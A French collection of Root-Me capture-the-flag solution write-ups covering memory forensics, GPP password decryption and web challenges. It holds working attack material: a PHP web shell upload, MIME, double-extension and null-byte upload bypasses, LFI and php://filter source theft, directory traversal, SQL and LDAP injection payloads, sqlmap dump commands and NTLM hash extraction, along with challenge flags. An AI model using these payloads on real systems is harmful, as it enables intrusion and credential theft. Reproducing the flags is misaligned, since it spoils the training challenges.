Une fois le dump extrait de l’archive, une recherche sur dans ce dernier nous donnera donc la réponse :
$ strings ch2.dmp | grep "^COMPUTERNAME" | head -n 1
COMPUTERNAME=WIN-ETSA91RKCFP

Valider le challenge avec : WIN-ETSA91RKCFP

##Command & Control - niveau 5
Petit chall de détente qui rappelle de ne pas laisser traîner ses dump, core dump et crashfiles.

Pour extraire un hash d’un user il faut préalablement connaitre l’offset de la ruche system et sam.
$ ./vol.py -f /tmp/e3a902d4d44e0f7bd9cb29865e0a15de.dmp --profile Win7SP1x86 hivelist
Volatile Systems Volatility Framework 2.1
Virtual    Physical   Name
---------- ---------- ----
0x8ee66740 0x141c0740 \SystemRoot\System32\Config\SOFTWARE
0x90cab9d0 0x172ab9d0 \SystemRoot\System32\Config\DEFAULT
0x9670e9d0 0x1ae709d0 \??\C:\Users\John Doe\ntuser.dat
0x9670f9d0 0x04a719d0 \??\C:\Users\John Doe\AppData\Local\Microsoft\Windows\UsrClass.dat
0x9aad6148 0x131af148 \SystemRoot\System32\Config\SAM
0x9ab25008 0x14a61008 \SystemRoot\System32\Config\SECURITY
0x9aba79d0 0x11a259d0 \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT
0x9abb1720 0x0a7d4720 \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT
0x82b6b140 0x02b6b140 [no name]
0x8b20c008 0x039e1008 [no name]
0x8b21c008 0x039ef008 \REGISTRY\MACHINE\SYSTEM
0x8b23c008 0x02ccf008 \REGISTRY\MACHINE\HARDWARE
0x8ee66008 0x141c0008 \Device\HarddiskVolume1\Boot\BCD

Dans notre cas 0x8b21c008 et 0x9aad6148

Puis on demande l’extraction des hash NTLM

$ ./vol.py -f /tmp/e3a902d4d44e0f7bd9cb29865e0a15de.dmp --profile Win7SP1x86 hashdump -y 0x8b21c008 -s 0x9aad6148
Volatile Systems Volatility Framework 2.1
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
John Doe:1000:aad3b435b51404eeaad3b435b51404ee:b9f917853e3dbf6e6831ecce60725930:::

Normalement pour la suite, pas besoin de sortir HashCat, google suffit , .. Nota, c’est le premier hash ntlm sur root-me.

ex : http://forum.insidepro.com/viewtopic.php?t=1742&postdays=0&postorder=asc&start=240&sid=4f7f57f83198b690c86d5ab0ebdd7384

Flag : passw0rd

##Trouvez le chat
On récupère l’archive et on la décompresse. Un petit test pour voir à quoi on a affaire :
/forensic $ file chall9
chall9: x86 boot sector; partition 1: ID=0xb, starthead 32, startsector 2048, 260096 sectors, extended partition table (last)\011, code offset 0x0

On est en présence d’une partition. J’ai pris le parti de ne pas la monter dans un premier temps et utilisé foremost pour voir si il y avait de la donnée a récupérer.
/forensic $ foremost -T -i chall9 -o ./output -t all
Processing: chall9
**|

On récupère un certains nombres de fichiers :
/forensic $ du -hs output_Wed_Aug_14_15_26_01_2013/*
16K        output_Wed_Aug_14_15_26_01_2013/audit.txt
284K        output_Wed_Aug_14_15_26_01_2013/gif
2,3M        output_Wed_Aug_14_15_26_01_2013/htm
664K        output_Wed_Aug_14_15_26_01_2013/jpg
16M        output_Wed_Aug_14_15_26_01_2013/ole
7,6M        output_Wed_Aug_14_15_26_01_2013/pdf
536K        output_Wed_Aug_14_15_26_01_2013/png
2,4M        output_Wed_Aug_14_15_26_01_2013/zip

On fouille un peu et on tombe sur deux choses intéressantes :

    un GIF avec une revendication sur la libération de l’Alsace avec une photo de Chat
    un zip avec la même jolie photo de chat

On test les données EXIF du jpg :
/forensic $ exiftags 1000000000000CC000000990038D2A62.jpg
Camera-Specific Properties:

Equipment Make: Apple
Camera Model: iPhone 4S
Camera Software: 6.1.2
Sensing Method: One-Chip Color Area
Focal Length (35mm Equiv): 35 mm

Image-Specific Properties:

Image Orientation: Top, Left-Hand
Horizontal Resolution: 72 dpi
Vertical Resolution: 72 dpi
Image Created: 2013:03:11 11:47:07
Exposure Time: 1/20 sec
F-Number: f/2.4
Exposure Program: Normal Program
ISO Speed Rating: 160
Lens Aperture: f/2.4
Brightness: 1.5 EV
Metering Mode: Pattern
Flash: No Flash, Compulsory
Focal Length: 4.28 mm
Color Space Information: sRGB
Image Width: 3264
Image Height: 2448
Exposure Mode: Auto
White Balance: Auto
Scene Capture Type: Standard
Latitude: N 47� 36' 16.146
Longitude: E 7� 24' 52.4844
Altitude: 16.78 m
Time (UTC): 07:46:50.85

Il reste plus qu’à récupérer les coordonnées GPS et trouver le nom de la ville 8^)

PS : Au final, je n’ai pas eu besoin de monter la partition.

##Active Directory - GPO
- Solution 1
Bonjour,

En ouvrant le pcap fournit avec Wireshark, vous trouvez nombres de requêtes comme celle ci :
SMB2        450        Create Request File: nilux.me\Policies\{1A3EE4C4-70BE-49B8-B0B0-33C8EEBD3598}\Machine\Scripts\Startup\statup.bat

Elles correspondent aux GPO.
Un petit clic droit —> Follow TCP String pour obtenir :

    <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="Administrateur" image="2" changed="2015-05-05 14:19:53" uid="{5E34317F-8726-4F7C-BF8B-91B2E52FB3F7}" userContext="0" removePolicy="0">
    <Properties action="U" newName="" fullName="Admin Local" description="" cpassword="LjFWQMzS3GWDeav7+0Q0oSoOM43VwD30YZDVaItj8e0" changeLogon="0" noChange="0" neverExpires="1" acctDisabled="0" subAuthority="" userName="Administrateur"/>
    </User></Groups>
    
il suffit ensuite d’utiliser gpp-decrypt (fournit de base sous Kali) sur le cpassword et nous avons le mdp :

    gpp-decrypt LjFWQMzS3GWDeav7+0Q0oSoOM43VwD30YZDVaItj8e0
    TuM@sTrouv3
- Solution 2
Pour ce chall, un fichier .pcap est mis à notre disposition.
Notre premier réflexe est d’utiliser Wireshark, mais en réalité, ce n’est pas la peine.

Il suffit d’ouvrir le fichier .pcap dans un éditeur de texte ou dans un éditeur hexa, et de chercher le nœud cpassword pour le User Administrateur.
Et d’après ce lien, on trouve alors :
<User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="Administrateur" image="2" changed="2015-05-05 14:19:53" uid="{5E34317F-8726-4F7C-BF8B-91B2E52FB3F7}" userContext="0" removePolicy="0"><Properties action="U" newName="" fullName="Admin Local" description="" cpassword="LjFWQMzS3GWDeav7+0Q0oSoOM43VwD30YZDVaItj8e0" changeLogon="0" noChange="0" neverExpires="1" acctDisabled="0" subAuthority="" userName="Administrateur"/></User>

Et donc le mot de passe : "LjFWQMzS3GWDeav7+0Q0oSoOM43VwD30YZDVaItj8e0"

Une fois le mot de passe en poche, il suffit de le déchiffrer.
D’après ce lien, on trouve un petit exploit tout tracé pour résoudre notre problème.

    require 'rubygems'
    require 'openssl'
    require 'base64'
     
    encrypted_data = "LjFWQMzS3GWDeav7+0Q0oSoOM43VwD30YZDVaItj8e0"
     
    def decrypt(encrypted_data)
      padding = "=" * (4 - (encrypted_data.length % 4))
      epassword = "#{encrypted_data}#{padding}"
      decoded = Base64.decode64(epassword)
     
      key = "\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"
      aes = OpenSSL::Cipher::Cipher.new("AES-256-CBC")
      aes.decrypt
      aes.key = key
      plaintext = aes.update(decoded)
      plaintext << aes.final
      pass = plaintext.unpack('v*').pack('C*') # UNICODE conversion
     
      return pass
     end
     
    blah = decrypt(encrypted_data)
    puts blah 


- Plus qu’à faire un petit :

$ ruby ad_gpo.rb
TuM@sTrouv3

        
#########              
WEB-SERVEUR
==
#########

##HTML
HTML, est le format de données conçu pour représenter les pages web. Le code HTML du challenge contient le commentaire suivant : 

Bienvennue sur ce portail,
On y retrouve le texte "légèrement caché" suivant :
Je crois que c'est vraiment trop simple là !
      password : nZ^&@q5&sjJHev0

##Mot de passse faible
En testant successivement des couples d’identifiants triviaux, on trouve rapidement le couple
suivant :
nom d’utilisateur : admin
mot de passe : admin

##User agent
- Solution 1
On peut également changer l’user agent avec Curl. On teste avec admin, et ça passe !
curl -v —header "User-Agent : admin" -X GET http://challenge01.root-me.org/web-serveur/ch2/
- Solution 2
Pour ce challenge, j’ai téléchargé le module ’tamper data’ pour firefox : 
https://addons.mozilla.org/fr/firef...
Une fois installé, il suffit de se rendre sur la page du challenge, ouvrir tamper data et cliquer sur ’altérer les données’.
Enfin, il faut changer l’user agent (mozilla pour ma part) en "admin". 
On envoie et voila, le flag apparait.
- Solution 3
On voit bien qu’il faut changer le User-Agent, après quelques tests avec wget, on trouve cela avec le useragent "admin" :
wget -U 'admin' -O - http://challenge01.root-me.org//web-serveur/ch2/ 2>/dev/null
<html><body><iframe style="width: 100%; height: 45px; margin: 0; padding: 0;" src="http://www.root-me.org/spip.php?page=externe_header" scrolling="no" frameborder="0"></iframe><h3>Welcome master !<br/>Password : rr$Li9%L34qd1AAe27</h3></body></html>

- Solution 4
Avec Firefox :
Dans about:config, créer une chaine de caractères general.useragent.override et y placer admin
- Solution 5
Bon, les autres solutions sont beaucoup plus élégantes que la mienne, mais comme elle n’est pas citée la voici :
J’ai utilisé Burp Suite pour modifier le user agent et le mettre à admin.
Ca se fait dans Proxy -> Options -> Match and replace
##Fichier de sauvegarde
Principe :
Il existe un fichier de backup emacs dont le nom est constitué par l’ajout du caractère tilde à la fin du nom du fichier originel.
- Résolution :
Pour visualiser le contenu du fichier il faut utiliser l’url :
http://challenge01.root-me.org/web-serveur/ch11/index.php~
Le code affiche le username et le pass ; en utilisant ceux-ci dans le formulaire on affiche une page qui dit que l’on peut valider avec ce pass.

Le pass trouvé dans le code valide effectivement le challenge.
##HTTP directory indexing
**solution1
La page du challenge s’appelle ch4.html, et non index.*

En l’occurence, la page index n’existe pas, ce qui nous donne accès à l’arborescence du site, en se placant dans le répertoire ch4.

A partir de là, c’est trivial, on navigue jusqu’au fichier admin.txt qui contient le pass.
##HTTP Headers
- Solution 1
Comme le titre l’indique, les http headers doivent contenir des informations intéressantes.
Pour faire une requête sur la page web, nous allons utiliser curl :
    curl -v http://challenge01.root-me.org/web-serveur/ch5/
    * Hostname was NOT found in DNS cache
    *   Trying 212.129.38.224...
    * Connected to challenge01.root-me.org (127.0.0.1) port 80 (#0)
    > GET /web-serveur/ch5/ HTTP/1.1
    > User-Agent: curl/7.37.1
    > Host: challenge01.root-me.org
    > Accept: */*
    >
    < HTTP/1.1 200 OK
    * Server nginx is not blacklisted
    < Server: nginx
    < Date: Sun, 11 Jan 2015 19:45:51 GMT
    < Content-Type: text/html; charset=UTF-8
    < Transfer-Encoding: chunked
    < Connection: keep-alive
    < Vary: Accept-Encoding
    < Header-RootMe-Admin: none
    <
    <html>
    <body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='http://www.root-me.org/spip.php?page=externe_header'></iframe>
    <p>Content is not the only part of an HTTP response!</p>
    </body>
    </html>
    * Connection #0 to host challenge01.root-me.org left intact
    
 Dans le output, il y a un des headers qui nous saute aux yeux Header-RootMe-Admin : none. Essayons d’envoyer encore une requête mais avec ce paramètre à true, car nous devons nous connecter à cette page en tant qu’admin.
 
    curl -v  -H "Header-RootMe-Admin: true" http://challenge01.root-me.org/web-serveur/ch5/
    * Hostname was NOT found in DNS cache
    *   Trying 212.129.38.224...
    * Connected to challenge01.root-me.org (127.0.0.1) port 80 (#0)
    > GET /web-serveur/ch5/ HTTP/1.1
    > User-Agent: curl/7.37.1
    > Host: challenge01.root-me.org
    > Accept: */*
    > Header-RootMe-Admin: true
    >
    < HTTP/1.1 200 OK
    * Server nginx is not blacklisted
    < Server: nginx
    < Date: Sun, 11 Jan 2015 19:49:30 GMT
    < Content-Type: text/html; charset=UTF-8
    < Transfer-Encoding: chunked
    < Connection: keep-alive
    < Vary: Accept-Encoding
    < Header-RootMe-Admin: none
    <
    <html>
    <body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='http://www.root-me.org/spip.php?page=externe_header'></iframe>
    <p>Content is not the only part of an HTTP response!</p>
    <p>You dit it ! You can validate the challenge with the password XXX</p></body>
    </html>
    * Connection #0 to host challenge01.root-me.org left intact
    
Et voilà, le serveur nous a authentifié en tant qu’admin en changeant simplement la valeur du header à true.
- Solution2
on repère facilement "Header-RootMe-Admin:none" dans le header de la réponse...

on essaie une requête sur l’url en ajoutant ce paramètre à ’true’ dans le header dans un script en python :
    import urllib.request
    req = urllib.request.Request(url="http://challenge01.root-me.org/web-serveur/ch5/",data=b'None',headers={'Header-RootMe-Admin':'true'})
    handler = urllib.request.urlopen(req)
    print("Body : ",handler.read())
- solution3
wget -d --header="Header-RootMe-Admin:true" http://challenge01.root-me.org/web-serveur/ch5/    
##HTTP verb tampering
’ai pour ma part utilisé l’utilitaire curl pour appeler l’URL de l’épreuve et contourner la méthode GET en utilisant par exemple PUT (option -X), la session spip ayant été préalablement récupérée en se connectant au site avec un navigateur et un add-on live http header.

    curl -v -X PUT -b spip_session=xxxxxx http://challenge01.root-me.org//web-serveur/ch8/ > password.html

J’ai donc obtenu le mot de passe recherché dans password.html.

##Install files
Dans la série des "fichiers oubliés", une faille très courante est l’oubli de fichiers d’installation de framework php dans l’arborescence web. Ici, on regarde le code source de la page http://challenge.root-me.org/web-serveur/ch6/ On y trouve un commentaire HTML :
/web-serveur/ch6/phpbb

On google un peu avec des mots clés du type "install file phpbb" et on trouve rapidement que le fichier d’installation se nomme "/install/install.php". On accoure donc vers notre challenge, on demande la page /web-serveur/ch6/phpbb/install/install.php et là, on trouve un joli message nous offrant le flag
##Redirection invalide
-Solution1
L’outil netcat peut aussi être utile pour résoudre ce challenge. La ligne de commande suivante m’a permis d’avoir le header et le contenu de la page d’index :

~ $ echo -en "GET /web-serveur/ch32/index.php HTTP/1.1 \r\nHost: challenge01.root-me.org\r\n\r\n" | netcat challenge01.root-me.org 80 > http1.1challengeLocation

Je redirige la réponse de la commande dans un fichier pour le lire plus facilement, il faut ensuite l’ouvrir avec la commande suivante :
~ $ more http1.1challengeLocation
**Solution2
On lance tcpdump avec :

- i : l’interface sur laquelle on écoute.
- A : Afficher chaque packet en Ascii.

tcpdump -i wlo1 -A

On fait tourner, on revient au browser pour charger l’index.
Ensuite on arrête la capture, on regarde ce qu’on a capturé et on cherche un status 302, à savoir :
    HTTP/1.1 302 Moved Temporarily
    Server: nginx
    Date: Mon, 22 Dec 2014 19:19:47 GMT
    Content-Type: text/html; charset=UTF-8
    Transfer-Encoding: chunked
    Connection: keep-alive
    X-Powered-By: PHP/5.3.10-1ubuntu3.15
    Location: ./login.php?redirect
     
    229
    <html>
    <body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='http://www.root-me.org/spip.php?page=externe_header'></iframe>
    <h1>Welcome !</h1>
     
    <p>Yeah ! The redirection is OK, but without exit() after the header('Location: ...'), PHP just continue the execution and send the page content !...</p>
    <p><a href="http://cwe.mitre.org/data/definitions/698.html">CWE-698: Execution After Redirect (EAR)</a></p>
    <p>The flag is : xxx</p>
    </body>
    </html>
##CRLF    
##File upload - double extensions
- Énoncé

Votre objectif est de compromettre cette galerie photo en y uploadant du code PHP.
 Challenge
-Solution1
Dans ce challenge, nous avons à faire avec une section upload, qui permet à l’utilisateur de poster ses images dans une galerie.
Le but ici est de bypasser la sécurité mise en place pour pouvoir uploader un fichier autre que .gif, .jpeg ou .png.
Sus à l’ennemi !

Sachant qu’il y a déjà d’autres challenges sur des failles lors de l’upload d’images, je dois dire que la recherche se restreint puisqu’il n’est pas nécessaire de tester une faille de type MIME or NULL Byte.

Dans ce très joli article http://www.acunetix.com/websitesecurity/upload-forms-threat/ qui regroupe plusieurs attaques, nous nous intéressons tout d’abord au "Case 4". Malheureusement, en tentant l’upload d’un fichier "backdoor.php.ersqc", nous échouons.

En regardant "Case 5", nous retentons l’attaque avec "backdoor.php.jpeg" et ça passe.
La faille

Nous comprenons, grâce à l’article en lien, que le serveur Apache sur lequel tourne le site est configuré pour exécuter tout les fichiers contenant ".php" dedans.
De plus, une liste blanche des extensions est utilisée pour checker l’extension du fichier. Dans notre cas ".jpeg" se trouve dedans.

Les deux éléments combinés nous donne une petite faille où il est possible d’upload une "backdoor php" juste en la renommant "backdoor.php.jpeg".

Facile non ?
Give me dat flag !

Maintenant que le fichier est uploadé, si nous cliquons dessus dans la gallerie, nous tombons sur un message toujours aussi agréable :
"Well done ! You can validate this challenge with the password : PV1OejHY4MxfsC2mHpRz9
This file is already deleted."

Flag : PV1OejHY4MxfsC2mHpRz9
- Ressources

Liste des failles upload : http://www.acunetix.com/websitesecurity/upload-forms-threat/
##File upload - type MIME
**Solution1
Explications

La "sécurité" mise en place permet de contrôler les fichiers uploadés par le content-type du fichier. Celui-ci est restreint à image/gif, image/jpeg ou image/png.

But de l’épreuve

Le but est d’uploader un fichier .php alors que nous n’en avons pas la possibilité.

Solution

On va tout d’abord créer un petit fichier .php tout simple :

    <?php 
    echo "Hacked !" 
    ?>

Télécharger

En utilisant l’add-on firefox "Tamper Data", nous allons altérer les données pendant l’upload de notre fichier .php ce qui nous donne dans la valeur du paramètre post :

-----------------------------1689563191601855649745964278\r\nContent-Disposition: form-data; name="file"; filename="mime.php"\r\nContent-Type: application/x-php\r\n\r\n<?php\necho "Hacked !"\n?>\n\r\n-----------------------------1689563191601855649745964278--\r\n

Il suffit donc de modifier "Content-Type : application/x-php" par "Content-Type : image/jpeg" ou "Content-Type : image/gif" ou encore "Content-Type : image/png".

Résultat

Lorsque l’on retourne dans la catégorie upload de l’épreuve, on peut voir notre fichier, qu’il suffit d’ouvrir pour avoir le pass :
Well done ! You can validate this challenge with the password
This file is already deleted.
**Solution2
Introduction :

Un Internet media type1, à l’origine appelé type MIME ou juste MIME ou encore Content-type2, 
est un identifiant de format de données sur internet en deux parties. Les identifiants étaient à l’origine définis dans la RFC 2046 
pour leur utilisation dans les courriels à travers du SMTP mais ils ont été étendus à d’autres protocoles comme le HTTP ou le SIP.

source : Wikipédia (^_^)

Exploitation :

Revenons maintenant à notre challenge. Nous devons, d’après l’énoncé, uploader un code PHP dans cette galerie de photos. Allons y faire un tour !
Après quelques recherches nous tombons sur une page "upload" où il y a une NB :
NB : only GIF, JPEG or PNG are accepted

En effet, si nous y mettons une image c’est ok, si non il nous affiche
"Wrong file type !"

Pas de problème, nous allons contourner cette protection. Qui ne semble être mise que sur le champ Content-type. 
Pour cela nous allons utiliser un proxy local pour changer ce champs clin d'œil ! Pour mon cas j’utilise Burp Suite

Le fichier que je veux uploader est le suivant
<?php
system($_GET['command']);
?>

En configurant le proxy local pour écouter sur 127.0.0.1:8080, et de même pour le browser, nous arrivons à intercepter la requête :
------WebKitFormBoundaryZ8GVPDDa77REhNE9
Content-Disposition: form-data; name="file"; filename="a2.php"
Content-Type: application/octet-stream

<?php
system($_GET['command']);
?>
------WebKitFormBoundaryZ8GVPDDa77REhNE9--

Pour faire les choses proprement, nous allons remplacer le champs Content-Type par "image/jpeg" ou "image/gif" ou n’importe quel autre type supporté.
------WebKitFormBoundaryZ8GVPDDa77REhNE9
Content-Disposition: form-data; name="file"; filename="a2.php"
Content-Type: image/jpeg

<?php
system($_GET['command']);
?>
------WebKitFormBoundaryZ8GVPDDa77REhNE9--

Et voilà le tour est joué, nous avons à présent compromis le serveur web (rien de méchant langue tirée ).

Le nom du fichier sur le serveur nous étant donné, il ne nous reste plus qu’à essayer d’y accéder(dans le dossier upload/) et là nous avons le flag :
Well done ! You can validate this challenge with the password
This file is already deleted.

M3µ0
- Solution3
Ma solution se base à partir de l’utilisation de curl :
$ curl -i -F "file=@shell.php;type=image/gif" --cookie "PHPSESSID=XXXXXXXXX" "http://challenge01.root-me.org/web-serveur/ch21/?action=upload"
L’option -i inclus les en-têtes du protocole de la requête, ici HTTP, à la sortie de la commande.

L’option -F permet d’indiquer le nom du fichier à uploader ainsi que le type du fichier que l’on définit comme étant une image gif.
Ici shell.php sera le nom de mon fichier en local que je souhaite uploader sur le serveur.

L’option - - cookie permet d’indiquer notre cookie de session

Nous obtenons alors :
HTTP/1.1 100 Continue

HTTP/1.1 200 OK
Server: nginx
...
Strict Standards: <li>Upload: shell.php</li><li>Type: image/gif</li><li>Size: 0.3984375 kB</li><li>Stored in: /tmp/phpdOzZmM</li></ul><b>File uploaded</b>.</body></html>
Donc le fichier est bien uploadé sur le serveur, pour le vérifier il faut toujours passer par curl (un browser ne donnera rien).
$ curl --cookie "PHPSESSID=XXXXXXXXX" "http://challenge01.root-me.org/web-serveur/ch21/?galerie=upload"
- Résultat :
...<a href='./galerie/upload/350972a90338feeaec1c9dab0eedb169//shell.php'><img width=64px height=64px src='./galerie/upload/350972a90338feeaec1c9dab0eedb169//shell.php?preview' alt='shell.php'></a>...
Je vérifie avec mon browser habituel à la page :
http://challenge01.root-me.org/web-serveur/ch21/galerie/upload/350972a90338feeaec1c9dab0eedb169//shell.php

Résultat :
Well done ! You can validate this challenge with the password
This file is already deleted.
##HTTP cookies
-Solution1
Sur la page du challenge il y a un lien qui permet de voir les e-mails sauvegardés, on va donc voir d’abord qui à posté son e-mail... 
mais en cliquant dessus un message apparaît :

You need to be admin

De plus on remarque que l’url a changé :

http://challenge01.root-me.org//web-serveur/ch7/?c=visiteur

On modifie un peu l’url en replaçant "visiteur" par "admin" , ce qui donne un autre message :
    http://challenge01.root-me.org//web-serveur/ch7/?c=admin
     
    Saved email adresses
    Problem with cookie
On va donc vérifier les cookies qui sont envoyés au serveur pour mieux comprendre avec l’extension de firefox
"En-têtes HTTP en direct" et l’on a :

Cookie: challenge_frame=1; ch7=visiteur[...]

On va rejouer l’en-tête en remplaçant "visiteur" par "admin" pour faire croire au serveur que l’on est administrateur.

Sur la page du challenge un nouveau message apparaît :

Validation password : LE_FLAG_DU_CHALLENGE

Et voilà challenge validé

Outils : http://livehttpheaders.mozdev.org/
https://addons.mozilla.org/fr/firefox/addon/live-http-headers/
-Solution2
Cliquons sur le lien "Voir les adresses email enregistrés". On a en retour le message "Vous devez être admin pour voir les email"

En examinant le code source de la page, on retrouve en commentaire :
<!--SetCookie("ch7","visiteur");-->

On peut donc en déduire qu’un cookie est utilisé. Ouvrons la console Firebug et examinons les cookies. On retrouve bien un cookie "ex7" ayant pour valeur "visiteur".
Modifions la valeur d’ex7 en "admin" et cliquons à nouveau sur le lien "Voir les adresses email enregistrés".

Et voilà :
Le mot de passe est ml-SYMPA
##Directory traversal
Le Directory Traversal est une faille qui fait partie du top 10 actuel des failles Web les plus utilisées. Dans notre cas, au départ, on se trouve sur la page http://challenge.root-me.org/web-serveur/ch15/ch15.php. En allant dans les différentes catégories, on peut voir qu’un paramètre GET est utilisé par l’application :

http://challenge.root-me.org/web-serveur/ch15/index.php?galerie=devices
http://challenge.root-me.org/web-serveur/ch15/index.php?galerie=categories
...

On peut alors imaginer que ce paramètre $_GET[’galerie’] pourrait être une "inclusion" de répertoire via une fonction opendir() / readdir()...

Pour le vérifier, tentons de remonter :
http://challenge.root-me.org/web-serveur/ch15/index.php?galerie=../

Bingo ! On obtient deux images : ch15.php et galerie

Après un peu d’investigation, on finit par trouver l’adresse suivante :
http://challenge.root-me.org/web-serveur/ch15/index.php?galerie=../galerie/86hwnX2r/

Nous voilà donc devant plusieurs fichiers dont un nommé password.txt
Il suffit alors de lire le contenu du fichier pour trouver le flag.
##File upload - null byte
- Créer un fichier shell.php en y inscrivant le code de votre choix du style :
<?php echo "hello world !!"; ?>

On va induire en erreur le processus de vérification des formats d’images en renommant notre script shell.php en shell.php.gif et on test. Ça ne passe pas, car le processus semble détecter le .php

Pour en finir avec cet exercice, j’ai fini par rajouter un NULL BYTE au nom de mon fichier comme ceci :
shell.php.gif en shell.php%00.gif
%00 correspond au NULL BYTE

Magie magie le fichier est upload avec succès avec comme nom final shell.php et non shell.php.gif
##PHP filters
Première étape, comme pour tous les challs : Lire la doc associée

- On apprend :

    Les LFI via les paramètres GET des URL
    Qu’il est possible, grâce aux wrappers PHP, de récupérer le contenu d’un fichier en base64

- On combine ces deux nouveautés

http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=accueil.php

On est bon !

Petit script pour faire du python pour le plaisir et je m’ennuyais obtenir la source des différents pages.
    import sys
    import requests
    import base64
     
    def getContent(url, page):
            filter = "php://filter/convert.base64-encode/resource="
            target = url+filter+page
            r = requests.get(target)
            return r.content
     
    #Modify if the page structure is different
    def extractB64(html):
            a = html.split('\n')[8]
            return a
     
    def decodeB64(b64_string):
            return base64.b64decode(b64_string)
     
     
    if __name__ == '__main__':
     
            if len(sys.argv) < 3:
                    print "[-] Usage python " + sys.argv[0] + " <url> <page>\nExample: http://challenge01.root-me.org/web-serveur/ch12/?inc=login.php\npython " + sys.argv[0] + " http://challenge01.root-me.org/web-serveur/ch12/?inc= login.php"
                    exit()
            url = sys.argv[1]
            getParam = sys.argv[2]
            print "[+] Trying to get ressource ..."
            html = getContent(sys.argv[1],sys.argv[2])
            b64_encoded = extractB64(html)
            print decodeB64(b64_encoded)
Avec ça nous apprenons via login.php l’existence du fichier config.php

    <?php
     
    $username="admin";
    $password="DAPt9D2mky0APAF";
     
    ?>

qui permet de trouver le mot de passe de l’utilisateur admin, qui est s’avère être le flag. 

##Local File Inclusion
- Principe :

Il s’agit ici comme le titre le laisse entendre d’exploiter une vulnérabilité de type LFI (Local File Inclusion), ou inclusion de fichier local.

- Résolution :

S’agissant juste d’un challenge, pas d’un "réaliste", je suppose qu’il ne faut pas aller chercher trop loin. D’ailleurs, un tour du site ne montre aucun contenu intéressant genre page d’upload de fichier. La seule chose que je constate est la présence d’un répertoire "admin" à la racine du site, qui se repère grâce au lien "admin" en haut à droite.

En observant l’utilisation des variables "files" et "f" pendant le parcours du site, on constate que l’on peut parcourir les répertoires et lister la racine du site avec

http://challenge.root-me.org//web-serveur/ch16/?files=../

On peut aussi lire les fichiers, par exemple l’index du site avec

http://challenge.root-me.org//web-serveur/ch16/?files=../&f=ch16.php

On trouve ainsi le fichier "admin/index.php"
http://challenge.root-me.org//web-serveur/ch16/?files=../admin&f=index.php

qui contient entre autres
$realm = 'PHP Restricted area';
$users = array('admin' => 'OpbNJ60xYpvAQU8');

- Flag :

OpbNJ60xYpvAQU8

##SQL injection - authentification

-Solution1
Nous sommes face à un formulaire d’authentification. Lors de l’utilisation du caractère ’ dans l’un des champs la page aboutit sur une erreur de syntaxe. Le caractère n’est sûrement pas filtré correctement. La requête SQL utilisée pour vérifier le nom d’utilisateur et le mot de passe fourni est peut-être du type :

    SELECT XYZ FROM USER WHERE login='[notre_login]' AND password='[notre_password]'

Si cette affirmation est vraie, il suffit d’injecter le motif admin’ — pour que la requête soit modifiée et valide l’authentification quel que soit le mot de passe donné :

    SELECT XYZ FROM USER WHERE login='admin' --' and password='[notre_password]'
Une fois authentifié, on peut voir un formulaire permettant de modifier son mot de passe. Dans ce cas il s’agit du mot de passe de l’administrateur. Le champ contenant le mot de passe est de type "password" et est inactif ; on ne voit donc pas le mot de passe directement mais il suffit de regarder le code HTML de la page :

    <input type="password" value="t0_W34k!$" disabled />
-Solution2
Très simple à faire avec Sqlmap. Tout d’abord j’ai lancé une petite analyse surtout pour savoir quels paramètres étaient vulnérables et quelle base de donnée tournait en backend (paramètre —dbs). Comme le formulaire est du POST, il est nécessaire de spécifier un example de valeur pour les 2 champs du formulaire.

$ sqlmap -u "http://challenge01.root-me.org/web-serveur/ch9/" --threads=4 --batch --data="login=admin&password=1234" --dbs

A la suite de cette commande, on peut voir que c’est probablement un base de donnée SQLite. Le nom de la base n’a pas pu etre touvé .On peut donc par la suite spécifier à SQLmap que c’est ce type de base afin d’exécuter que des tests concernant ce type de base de données. On peut ensuite essayer de retrouver les tables en faisant une énumération

$ sqlmap -u "http://challenge01.root-me.org/web-serveur/ch9/" --threads=4 --batch --data="login=admin&password=1234" --dbms=SQLite --tables

Cette fois-ci, le résultat est très intéressant. Non seulement, on trouve le nom des tables mais également le nom de la base de donnée.
[14:43:42] [INFO] fetching tables for database: 'SQLite_masterdb'
[14:43:48] [INFO] the SQL query used returns 1 entries
[14:43:54] [INFO] retrieved: users
Database: SQLite_masterdb                                                                                                                                                                              
[1 table]
+-------+
| users |
+-------+

Il ne reste plus qu’à dumper cette table.

$ sqlmap -u "http://challenge01.root-me.org/web-serveur/ch9/" --threads=4 --batch --data="login=admin&password=1234" --dbms=SQLite -D SQLite_masterdb -T users --dump
[14:46:32] [INFO] retrieved: "2008","R78gsyd34dzf","user2"
[14:46:32] [INFO] retrieved: "2005","t0_W34k!$","admin"
[14:46:32] [INFO] retrieved: "2006","TYsgv75zgtq","user1"

et BAM ! all in the **** ! Flag = t0_W34k !$  
 
##LDAP injection - authentification

- Solution 1
En insérant a) dans username et passwd dans password on a le message d’erreur suivant :
ERROR : Invalid LDAP syntax : (&(uid=a))(userPassword=passwd))

La requête originale est donc :
ERROR : Invalid LDAP syntax : (&(uid=[username])(userPassword=[password]))

On a un ET logique, donc on doit avoir 2 champ qui renvoient vrai.
L’autre partie de la requête avec userPassword était gênant pour les tests, je voulais supprimer celà à la façon des commentaires en SQL (—). Pour celà, il a suffit d’utiliser le trick du NULL byte poisoning.

On finit avec cette entrée dans username (dans les headers en utilisant TamperData ou autre) :
*)(userPassword=*))%00

On peut laisser le champ password vide.

Y’a plus qu’à récupérer le flag dans le source

- Solution 2
